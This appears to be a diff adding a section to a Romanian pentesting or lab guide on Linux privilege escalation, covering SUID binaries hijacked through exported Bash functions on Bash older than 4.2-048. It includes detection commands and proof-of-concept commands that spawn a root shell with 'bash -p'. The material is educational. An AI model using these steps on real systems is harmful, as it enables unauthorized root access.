@@ -321,4 +321,50 @@ Pentru a deturna fluxul de execuție și a obține un shell de `root`:
    PATH=.:\$PATH /usr/local/bin/suid-env
    ```
 
-> ⚠️ **Notă:** Nu uita să folosești comanda `exit` pentru a ieși din shell-ul de root după ce ai finalizat testarea!
+---
+
+## 10. SUID Executable via Bash Functions (Bash < 4.2-048)
+
+### Mecanism & Vulnerabilitate
+Atunci când un binar SUID folosește calea absolută către un executabil extern (de exemplu, `/usr/sbin/service`), atacul clasic prin modificarea variabilei `PATH` este blocat. Totuși, pe versiuni vechi de **Bash (< 4.2-048)**, sistemul poate fi deturnat prin exportul unor funcții malițioase.
+
+Vulnerabilitatea se bazează pe două caracteristici din versiunile vechi de Bash:
+1. Permisiunea de a defini o funcție al cărei nume este identic cu o cale absolută de fișier (ex: numele funcției este literal `/usr/sbin/service`).
+2. Posibilitatea de a exporta aceste funcții în mediu (`export -f`). Când binarul SUID rulează și invocă un shell în spate, procesul citește funcția din memorie și o execută pe aceasta în locul fișierului real de pe disc.
+
+### Detecție și Verificare
+1. **Inspectarea binarului:**
+   Verifică dacă executabilul SUID folosește căi absolute pentru apeluri:
+   ```bash
+   strings /usr/local/bin/suid-env2
+   ```
+
+2. **Verificarea versiunii de Bash:**
+   Asigură-te că versiunea sistemului permite acest exploit:
+   ```bash
+   /bin/bash --version
+   ```
+
+### Etape de Exploatare (PoC)
+Pentru a intercepta apelul binarului SUID și a obține un shell cu privilegii depline:
+
+1. **Definirea funcției cu numele căii absolute:**
+   Creează o funcție locală denumită exact ca fișierul apelat de binar. Corpul funcției va lansa un shell Bash. Opțiunea `-p` (*privileged*) este obligatorie pentru a preveni renunțarea automată la drepturile de `root`:
+   ```bash
+   function /usr/sbin/service { /bin/bash -p; }
+   ```
+
+2. **Exportarea funcției în mediu:**
+   Fă funcția vizibilă pentru sub-procesele pornite de binarul SUID:
+   ```bash
+   export -f /usr/sbin/service
+   ```
+
+3. **Execuția binarului:**
+   Rulează executabilul SUID pentru a declanșa funcția exportată și a obține root shell-ul:
+   ```bash
+   /usr/local/bin/suid-env2
+   ```
+
+> ⚠️ **Notă:** Ca și în cazul precedent, rulează comanda `exit` la final pentru a închide sesiunea de root.
+
